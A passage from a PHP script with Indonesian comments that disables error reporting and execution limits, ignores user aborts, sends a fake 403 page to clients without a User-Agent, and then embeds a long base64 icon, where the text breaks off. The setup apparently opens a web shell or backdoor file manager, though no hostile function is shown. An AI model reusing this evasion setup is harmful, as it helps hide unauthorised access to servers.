<?php
// =================================================================
// KONFIGURASI & LOGIKA PHP
// =================================================================
set_time_limit(0);
error_reporting(0);
ignore_user_abort(true);

// --- Keamanan Dasar ---
if (!isset($_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.0 403 Forbidden');
    die('<h1>403 Forbidden</h1>');
}

$imageIco = "data:image/jpeg;base64,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